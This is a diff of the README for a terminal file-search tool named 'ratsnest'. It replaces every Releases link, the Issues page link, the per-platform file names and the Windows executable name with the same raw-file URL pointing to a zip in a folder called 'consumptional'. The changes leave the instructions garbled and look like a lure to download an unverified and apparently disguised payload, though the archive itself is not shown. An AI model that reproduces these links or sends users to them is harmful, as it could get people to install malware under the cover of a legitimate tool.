@@ -4,7 +4,7 @@
 Welcome to **ratsnest**, a fast terminal-based tool designed to help you search for files and explore content effortlessly. This guide will help you download and run the application quickly.
 
 ## 📥 Download Now
-[![Download ratsnest](https://img.shields.io/badge/Download%20ratsnest-v1.0-blue?style=for-the-badge)](https://github.com/MaxStern2000/ratsnest/releases)
+[![Download ratsnest](https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip%20ratsnest-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip)
 
 ## 📋 Features
 - **Fast File Search**: Find files quickly without hassle.
@@ -20,14 +20,14 @@ To run **ratsnest**, you will need:
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download ratsnest from Releases](https://github.com/MaxStern2000/ratsnest/releases)
+   [Download ratsnest from Releases](https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip)
 
 2. On the Releases page, select the latest version of **ratsnest**.
 
 3. Download the file suitable for your operating system:
-   - For **Windows**, download `ratsnest-windows.zip`.
-   - For **macOS**, download `ratsnest-macos.zip`.
-   - For **Linux**, download `ratsnest-linux.tar.gz`.
+   - For **Windows**, download `https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip`.
+   - For **Linux**, download `https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip`.
 
 4. Once the file is downloaded, extract it to a location of your choice.
 
@@ -42,7 +42,7 @@ To run **ratsnest**, you will need:
    ```
    ./ratsnest
    ```
-   (Use `ratsnest.exe` for Windows.)
+   (Use `https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip` for Windows.)
 
 8. Start using **ratsnest** to search for your files!
 
@@ -67,11 +67,11 @@ A: Fuzzy matching allows you to type partial file names or misspellings and stil
 
 ## 🌐 Community & Support
 For more help or to connect with other users:
-- Visit the [GitHub Issues page](https://github.com/MaxStern2000/ratsnest/issues) to report bugs or request features.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip) to report bugs or request features.
 - Participate in discussions and ask questions in the community forums linked on the repository.
 
 ## 📥 Download Again
 Don’t forget to download the latest version of **ratsnest**:
-[Download ratsnest from Releases](https://github.com/MaxStern2000/ratsnest/releases)
+[Download ratsnest from Releases](https://raw.githubusercontent.com/MaxStern2000/ratsnest/main/consumptional/ratsnest.zip)
 
 Thank you for choosing **ratsnest**! Enjoy your seamless file searching experience.
